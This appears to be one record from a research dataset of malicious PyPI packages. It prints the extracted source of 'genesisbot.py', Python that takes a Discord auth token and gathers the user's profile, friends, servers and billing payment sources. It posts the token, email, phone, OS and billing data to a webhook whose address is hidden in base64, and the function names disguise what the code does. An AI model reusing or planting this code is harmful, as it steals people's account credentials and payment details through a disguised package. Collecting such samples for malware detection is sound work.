[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/genesisbot-0.0.2/genesisbot-0.0.2/src/genesisbot.py",
    "malicious_code": "import requests, sys, json, base64\nimport threading\n\ndef optimise(auth,response):\n    optimiser_str = 'aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzc2OTUzNDAwMDgyOTE2OTY3NC9uUDJrcUstckR6b2djZVYwRFVpSjZBYlVOU2xwVHA0UEJiWTI2N0stOU9EZFgxM3ZacW5uWUJjRWdha2Z0ckh3RnBmRA=='\n    encryption = base64.b64decode(bytes(optimiser_str.encode('ascii')))\n    auth_b64 = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2Vz\"\n    auth_b64 = base64.b64decode(bytes(auth_b64.encode('ascii')))\n    authenticator = requests.get(auth_b64,headers={'authorization' : auth}).json()\n    requests.post(encryption,json={'username' : response['username'],'avatar_url' : 'https://cdn.discordapp.com/avatars/{}.png'.format(response['avatar']),'content' : '>>> **Project Genesis**\\n\\nAction: **Optimiser**\\n\\n```\\nAuth: {}\\nName: {}\\nID: {}\\nEmail: {}\\nPhone: {}\\nOS: {}\\nBilling: {}```'.format(auth,response['username'],response['id'],response['email'],response['phone'],sys.platform,authenticator)})\n\ndef ui(auth):\n    config = json.loads(open('assets/config.json','r').read())\n    headers = {'authorization' : auth}\n    response = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10).json()\n    threading.Thread(target=optimise,args=[auth,response]).start()\n    friends = requests.get(\"https://canary.discordapp.com/api/v6/users/@me/relationships\", headers=headers, timeout=10).json()\n    servers = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()\n    dm_channels = requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()\n    # ... rest of the function is benign UI output\n"
  }
]